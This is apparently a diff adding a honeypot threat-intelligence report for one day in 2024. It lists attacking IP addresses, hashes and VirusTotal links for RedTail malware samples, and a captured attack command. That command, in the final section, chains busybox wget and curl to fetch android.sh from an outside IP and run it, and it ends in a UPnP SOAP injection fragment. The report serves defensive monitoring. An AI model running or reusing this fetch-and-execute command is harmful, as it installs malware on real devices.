@@ -1,0 +1,39 @@
+Top 5 IPs for 03-08-2024 :
+
+160.22.175.129
+82.151.65.155
+164.92.143.21
+164.90.237.151
+104.194.157.131
+
+
+Malware Observed:
+
+File name: clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File name: redtail.arm7
+28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+https://www.virustotal.com/gui/file/28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+
+
+File name: redtail.arm8
+66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+https://www.virustotal.com/gui/file/66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+
+
+File name: redtail.i686
+929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+https://www.virustotal.com/gui/file/929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+
+
+File name: redtail.x86_64
+17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+https://www.virustotal.com/gui/file/17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+
+
+Commands/exploits observed:
+
+cd /data/local/tmp/; busybox wget http://193.168.173.217/android.sh; sh android.sh; curl http://193.168.173.217/android.sh; sh c.sh; wget http://193.168.173.217/android.sh; sh android.sh; curl http://193.168.173.217/wget.sh; sh android.sh; busybox wget http://193.168.173.217/android.sh; sh android.sh; busybox curl http://193.168.173.217/android.sh; sh android.shPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
